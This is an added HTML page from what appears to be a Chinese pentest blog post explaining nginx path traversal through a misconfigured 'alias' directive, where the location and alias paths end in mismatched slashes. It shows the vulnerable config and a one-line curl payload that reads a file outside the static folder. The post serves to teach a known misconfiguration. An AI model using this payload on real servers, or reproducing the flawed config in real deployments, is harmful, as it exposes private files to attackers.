@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>nginx的目录穿越</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Study The World </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/nginx_config_path_traversle.html" rel="bookmark"
+           title="Permalink to nginx的目录穿越">nginx的目录穿越</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2019-09-17T00:00:00+02:00">
+                <a href='#'>09/17/2019 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>nginx在使用proxy_pass的时候，需要处理静态文件有时候会这样做:</p>
+<div class="highlight"><pre><span></span> <span class="k">location</span> <span class="o">/</span><span class="k">static</span> <span class="err">{</span>
+                <span class="k">alias</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="k">static</span><span class="o">/</span><span class="p">;</span>
+        <span class="err">}</span>
+</pre></div>
+
+
+<p>payload:</p>
+<div class="highlight"><pre><span></span><span class="n">curl</span> <span class="n">vuln</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="k">static</span><span class="p">..</span><span class="o">/</span><span class="n">requirements</span><span class="p">.</span><span class="n">pip</span>
+</pre></div>
+
+
+<p>上面如果是两个路径最后都没有带<code>/</code>或者都带<code>/</code>则该漏洞不存在。</p>
+<p>PS: 不知道为什么两个都不带没有存在漏洞。payload是<code>/../requirements.pip</code>失败</p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
